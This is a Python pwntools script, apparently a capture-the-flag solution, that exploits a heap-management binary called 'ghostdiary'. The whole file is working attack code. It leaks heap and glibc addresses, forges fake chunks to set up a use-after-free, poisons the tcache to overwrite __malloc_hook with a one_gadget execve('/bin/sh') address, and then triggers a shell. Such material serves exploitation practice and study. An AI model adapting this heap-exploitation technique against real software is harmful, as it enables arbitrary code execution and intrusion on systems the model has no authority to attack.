from pwn import *
from time import sleep

p = process('./ghostdiary')
DEBUG = False
GDB = False

def main():
	global p
	if GDB: gdb.attach(p)

	recv_menu()

	# ---------- Get pointer to start of heap space that we control ----------
	
	malloc(16)
	malloc(16)
	free(0)
	free(1)
	malloc(16)
	heap_ptr = str2int(read(0)) - 16
	print("Heap pointer: " + hex(heap_ptr))
	free(0)
	debug_input()

	# ---------- Create use-after-free exploit ----------

	# Fill tcache bin for size 0x100
	for i in range(8):
		malloc(280)
	for i in range(8):
		write(i, 'A'*280)

	for i in range(1, 8):
		free(i)

	free(0)

	malloc(56)
	offset_56h = 0x940
	malloc(296)
	offset_296h = 0x980
	# Overflow 2nd chunk to size 256
	write(0, 'B'*56)

	# Write a fake next chunk at offset 256
	offset_fake = 0xa80
	fake_chunk = ''
	# prev_size
	fake_chunk += 'S'*8
	# size
	fake_chunk += p64(0x31)
	# fwd
	fake_chunk += p64(heap_ptr + offset_56h)
	# bck
	fake_chunk += p64(heap_ptr + offset_56h)
	write(1, 'C'*240 + fake_chunk)

	# Write fake freed chunk in 1st chunk
	fake_freed_chunk = ''
	# fwd and bck
	fake_freed_chunk += p64(heap_ptr + offset_fake) * 2
	# filler data
	fake_freed_chunk += 'D'*32
	# prev_size
	fake_freed_chunk += p64(0x40)
	write(0, fake_freed_chunk)

	# Free the 2nd chunk
	free(1)

	print("Created use-after-free exploit")
	debug_input()

	# ---------- Get pointer to glibc ----------

	# Read the chunk exploited with the use-after-free exploit
	bin_ptr = str2int(read(0))
	print("Bin pointer: " + hex(bin_ptr))

	bin_offset = 0x3ebca0

	glibc_ptr = bin_ptr - bin_offset
	print("Glibc pointer: " + hex(glibc_ptr))
	debug_input()

	# ---------- Overwrite the hook and execute it ----------

	# Malloc then free to put chunk in tcache
	malloc(312)
	free(1)

	# Overwrite tcache pointer
	malloc_hook_offset = 0x3ebc30
	malloc_hook_ptr = glibc_ptr + malloc_hook_offset
	print("Hook pointer: " + hex(malloc_hook_ptr))
	write(0, p64(malloc_hook_ptr))
	print("Overwrote tcache pointer")
	debug_input()

	# Get the exploited chunk
	malloc(312)
	malloc(312)

	# Overwrite with one_gadget
	"""
	0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
	constraints:
	  rcx == NULL

	0x4f322 execve("/bin/sh", rsp+0x40, environ)
	constraints:
	  [rsp+0x40] == NULL

	0x10a38c execve("/bin/sh", rsp+0x70, environ)
	constraints:
	  [rsp+0x70] == NULL
	"""
	one_gadget_offset = 0x10a38c
	one_gadget_ptr = glibc_ptr + one_gadget_offset
	print("one_gadget pointer: " + hex(one_gadget_ptr))
	write(2, p64(one_gadget_ptr))
	print("Overwrote malloc_hook to one_gadget")
	debug_input()

	# Run the exploit by mallocing one last time
	p.sendline('1')
	p.sendline('2')
	p.sendline('420')
	p.recvuntil('size: ')

	# Debug
	print("Launching shell...")
	p.interactive()

def str2int(str):
	result = ""
	for c in str[::-1]:
		result += hex(ord(c))[2:]
	return int(result[1:], 16)

def pad(str, n):
	return str + '\x00' * (n - len(str))

def debug_input():
	global DEBUG
	if DEBUG: raw_input()

def recv_menu():
	global p, DEBUG
	p.recvuntil('5. Go to sleep')
	sleep(0.01)

def malloc(size):
	global p
	p.sendline('1')
	if (size <= 240):
		p.sendline('1')
	elif (size >= 272):
		p.sendline('2')
	else:
		raise Exception("Invalid size " + str(size))
	p.sendline(str(size))
	recv_menu()

def write(index, text):
	global p
	p.sendline('2')
	p.sendline(str(index))
	p.sendline(text)
	recv_menu()

def read(index):
	global p, DEBUG
	p.sendline('3')
	p.sendline(str(index))
	p.recvuntil('Content: ')
	out = p.recvline()
	if DEBUG: print("Recieved " + out)
	recv_menu()
	return out

def free(index):
	global p
	p.sendline('4')
	p.sendline(str(index))
	recv_menu()

def exit_program():
	global p
	p.sendline('5')

main()